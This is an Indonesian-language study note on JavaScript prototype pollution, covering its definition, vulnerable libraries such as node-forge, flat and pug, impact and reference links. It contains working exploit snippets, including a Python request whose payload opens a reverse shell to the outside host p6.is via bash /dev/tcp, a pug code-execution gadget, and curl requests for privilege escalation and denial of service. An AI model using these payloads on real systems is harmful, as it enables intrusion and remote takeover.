# Prototype Pollution
#web #rce #nodejs #objectinjection


## Definisi
Prototype adalah mekanisme pada JavaScript untuk menurunkan fitur dari satu objek ke objek lainnya.

Prototype Pollution adalah tipe dari serangan object injection.

Ketika JavaScript membuat objek baru, mereka membawa properties dan methods dari prototype "objek" yang mengandung fungsi dasar seperti `toString, constructor, hasOwnProperty`. Contoh pada fungsi `toString` yang berubah karena terpolusi.

```js
let customer = {name: "person", address:"here"}
console.log(customer.toString())
// output: {object Object}

customer.__proto__.toString = ()=>{alert("polluted")}
console.log(customer.toString())
// alert box pops up: "polluted"
```

Akibat dari prototype pollution di atas, setiap `toString()` dipanggil pada setiap objek, alert box akan muncul dengan tulisan "polluted", kecuali object tersebut secara explisit mengganti Objects.toString() dengan implementasinya sendiri.

Polusi ini dapat diinputkan ke dalam segala jenis user input pada aplikasi berbasis web, baik formulir, header, files, dan URL.

Hal ini dikarenakan banyak library JavaScript yang menerima opsi pada objek setelah memastikan keberadaan dari properti tertentu. Contoh:

```js
options.someOption = options.someOption || default.someOption;
```

## Deteksi
**Whitebox**
Versi lama dari node-forge(library untuk implementasi kriptografi di JavaScript) pada fungsi `util.setPath`. Atau pada library yang berfungsi sebagai property setting atau object-path-setting, seperti  `lodash set`.
```js
const nodeforge = require('node-forge')
var obj = {}
nodeforge.util.setPath(obj, ['__proto__', 'polluted'], true);
console.log(polluted)
```

Atau berdasarkan contoh pada definisi, ketika terdapat fungsi dasar `toString, constructor, hasOwnProperty`.
```js
let customer = {name: "person", address:"here"}
console.log(customer.toString())
// output: {object Object}

customer.__proto__.toString = ()=>{alert("polluted")}
console.log(customer.toString())
// alert box pops up: "polluted"
```

Lokasi lainnya pada library:

**flat**
```js
import requests  
  
TARGET_URL = 'http://p6.is:3000'  
  
# make pollution  
requests.post(TARGET_URL + '/vulnerable', json = {  
    "__proto__.type": "Program",  
    "__proto__.body": [{  
        "type": "MustacheStatement",  
        "path": 0,  
        "params": [{  
            "type": "NumberLiteral",  
            "value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"  
        }],  
        "loc": {  
            "start": 0,  
            "end": 0  
        }  
    }]  
})  
  
# execute  
requests.get(TARGET_URL)
```

**pug**
```js
const pug = require('pug');

Object.prototype.block = {"type": "Text", "line": "console.log(process.mainModule.require('child_process').execSync('id').toString())"};

const source = `h1= msg`;

var fn = pug.compile(source);
var html = fn({msg: 'It works'});

console.log(html); // "uid=0(root) gid=0(root) groups=0(root)\n\n<h1>It worksndefine</h1>"
```


- jQuery sebelum 3.4.0
- Handlebar
- express
- minimist
- hoek

## Dampak
Dampaknya: Denial of Service, SQL Injection, XSS, RCE.  
Teknik ini juga dapat bypass HTML sanitizer, contoh `html-sanitize` dan `DOMPurify`.

Injeksi payload pada polluted key (cluent side attack, XSS attack)
```http
https://vulnerable.app/?__proto__.[pollutedKey]=pollutedValue
```

Another Example from Snyk
```sh
# `{ name: "Robert", surname: "Tables", about: "Database sanitization expert" }`

# Privilege escalation
curl -H "Content-Type: application/json" -X POST -d '{"about": {"__proto__": {"role": "admin"}}}' https://api.startup.io/users/1337 && curl -X GET https://api.startup.io/users/1337/role

# Denial of Service terhadap fungsi toString
curl -H "Content-Type: application/json" -X POST -d '{"about": {"__proto__": {"toString": "Two bytes meet. The first byte asks: Are you ill? The second byte replies: No, just feeling a bit off."}}}' https://api.startup.io/users/1337
```


## Sumber
- https://learn.snyk.io/lessons/prototype-pollution/javascript/
- https://github.com/HoLyVieR/prototype-pollution-nsec18
- https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications
- https://blog.p6.is/AST-Injection/
- https://portswigger.net/daily-swig/node-js-applications-open-to-prototype-pollution-attacks-via-legacy-function-in-popular-encryption-library
- https://www.tenable.com/blog/identifying-prototype-pollution-vulnerabilities-using-tenable-io-web-application-scanning
- https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/

Bounty Reports
- https://hackerone.com/holyvier?type=user
